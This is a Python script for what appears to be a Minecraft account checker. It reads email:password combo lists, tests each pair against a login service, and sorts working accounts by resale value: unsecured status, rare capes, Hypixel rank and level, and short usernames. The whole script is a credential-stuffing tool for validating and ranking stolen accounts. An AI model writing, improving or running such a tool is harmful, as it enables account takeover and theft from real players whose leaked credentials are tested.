from account_checker import *
from cape_checker import *
from special_checker import *
from file_creator import *

create_files()
account_file_lines = open(BASIC_PATH + '\\accounts.txt').read().split('\n')
counter = [0,0,0,0,0,0,0,0,0,0,0]

for x in range(len(account_file_lines)):
    email_username = account_file_lines[x].split(':', 1)[0]
    password = account_file_lines[x].split(':', 1)[1]
    answer = account_login(email_username=email_username, password=password)

    if not str(answer).__contains__('Invalid credentials'):
        print('Valid Account')
        UUID = answer["availableProfiles"][0]["id"]
        print('UUID: ' + answer["availableProfiles"][0]["id"])
        USERNAME = answer["availableProfiles"][0]["name"]
        print('Username: ' + answer["availableProfiles"][0]["name"])
        hpRank = hypixel_rank_check(USERNAME)
        hpLevel = hypixel_level_check(USERNAME)

        open(FOLDER_PATH + '\\working.txt', 'a').write(account_file_lines[x] + "\n")
        counter[0] += 1

        if bool(answer["user"]["secured"]) is False:
            open(FOLDER_PATH + '\\unsecure.txt', 'a').write(account_file_lines[x] + "\n")
            counter[2] += 1
            print('Unsecure account')
        if minecon_cape_request(UUID) is True:
            open(FOLDER_PATH + '\\minecon.txt', 'a').write(account_file_lines[x] + "\n")
            counter[3] += 1
            print('Minecon-Cape')
        if five_zig_cape_request(UUID) is True:
            open(FOLDER_PATH + '\\optifine.txt', 'a').write(account_file_lines[x] + "\n")
            counter[4] += 1
            print('5zig-Cape')
        if optifine_cape_request(USERNAME) is True:
            open(FOLDER_PATH + '\\optifine.txt', 'a').write(account_file_lines[x] + "\n")
            counter[5] += 1
            print('Optifine-Cape')
        if laby_mod_cape_request(UUID) is True:
            open(FOLDER_PATH + '\\labymod.txt', 'a').write(account_file_lines[x] + "\n")
            counter[6] += 1
            print('Labymod-Cape')
        if liquidbounce_cape_request(UUID) is True:
            open(FOLDER_PATH + '\\liquidbounce.txt', 'a').write(account_file_lines[x] + "\n")
            counter[7] += 1
            print('LiquidBounce-Cape')
        if hpRank is not False:
            open(FOLDER_PATH + '\\hypixel.txt', 'a').write(account_file_lines[x] + "\n")
            counter[8] += 1
            print('Hypixel Rank: {0}'.format(hpRank))
        if hpLevel is not False:
            open(FOLDER_PATH + '\\hypixel.txt', 'a').write(account_file_lines[x] + "\n")
            counter[9] += 1
            print('Hypixel Level: {0}'.format(hpLevel))
        
        if under_four_character_long(USERNAME) is True:
            open(FOLDER_PATH + '\\special_name.txt', 'a').write(account_file_lines[x] + "\n")
            counter[10] += 1
            print('Short name')

        print('Progress: ' + str(x + 1)+'/' + str(len(account_file_lines)))
    else:
        print('Invalid Account')
        counter[1] += 1
        print('Progress: ' + str(x + 1) + '/' + str(len(account_file_lines)))

print('\n\nResult:\n')

counter_names = [str(counter[0]) + ' Valid accounts', str(counter[1]) + ' Invalid accounts',
                 str(counter[2]) + ' Insecure accounts', str(counter[3]) + ' Minecon accounts',
                 str(counter[4]) + ' 5zig accounts', str(counter[5]) + ' Optifine accounts',
                 str(counter[6]) + ' Labymod accounts', str(counter[7]) + ' LiquidBounce accounts',
                 str(counter[8]) + ' Ranked Hypixel accounts', str(counter[10]) + ' Short-name accounts']
for x in range(len(counter_names) - 0):
    print(counter_names[x])

input()